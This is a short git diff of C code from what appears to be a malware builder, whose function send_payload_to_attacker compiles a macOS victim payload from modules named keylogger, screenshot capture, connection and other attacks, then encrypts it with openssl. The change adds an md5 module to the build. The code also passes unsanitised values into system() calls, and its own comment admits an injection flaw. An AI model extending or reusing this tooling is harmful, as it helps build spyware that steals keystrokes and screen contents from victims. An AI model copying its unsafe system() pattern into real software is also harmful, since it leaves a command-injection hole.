@@ -141,7 +141,7 @@ void send_payload_to_attacker(int attacker_fd){
 	// generate the payload, for any attack we create temp folder that will hold his victim payload
 	sprintf(create_dir, "mkdir -p %d", attacker_fd);
 	system(create_dir);// creating temp folder to hole the payload 
-	sprintf(create_payload_command, "gcc victim_payload/Victim_main.c victim_payload/screenshot_capture.c victim_payload/keylogger.c victim_payload/connection.c victim_payload/other_attacks.c -framework ApplicationServices -framework Carbon -o %d/payload", attacker_fd); // in the further this command will cross compil the payload
+	sprintf(create_payload_command, "gcc victim_payload/Victim_main.c victim_payload/screenshot_capture.c victim_payload/keylogger.c victim_payload/connection.c victim_payload/other_attacks.c victim_payload/md5.c -framework ApplicationServices -framework Carbon -o %d/payload", attacker_fd); // in the further this command will cross compil the payload
 	system(create_payload_command);
 	sprintf(convert_file_to_buffer_commend, "openssl aes-256-cbc -base64 -in %d/payload -k %s",attacker_fd, AES_KEY); // there is injection variability, to be fix
 
